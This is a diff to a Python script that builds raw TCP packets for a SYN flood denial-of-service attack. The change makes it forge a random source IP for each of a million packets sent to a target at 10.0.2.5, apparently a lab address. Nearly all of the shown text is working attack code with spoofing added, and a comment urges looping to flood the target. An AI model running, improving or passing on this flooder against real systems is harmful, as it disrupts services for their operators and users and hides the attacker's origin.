@@ -5,7 +5,7 @@
 # some imports
 import socket, sys
 from datetime import time, datetime
-from random import randrange
+from random import randrange, random
 from struct import *
 
 
@@ -110,16 +110,18 @@ def creat(source_ip, dest_ip):
 
 
 
-def syn_flood(src, dst):
+def syn_flood(dst):
     rang = 1000000
-    s, packet = creat(src, dst)
+
     for i in range(rang):
+        src_ip = '{}.{}.{}.{}'.format(*__import__('random').sample(range(0, 255), 4))
+        s, packet = creat(src_ip, dst)
         time = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
         print(f"{time},{i}")
         s.sendto(packet, (dst, 0))  # put this in a loop if you want to flood the target
 
 
 if __name__ == '__main__':
-    src = "10.0.2.15"
     dst = "10.0.2.5"
-    syn_flood(src, dst)
+    syn_flood(dst)
+
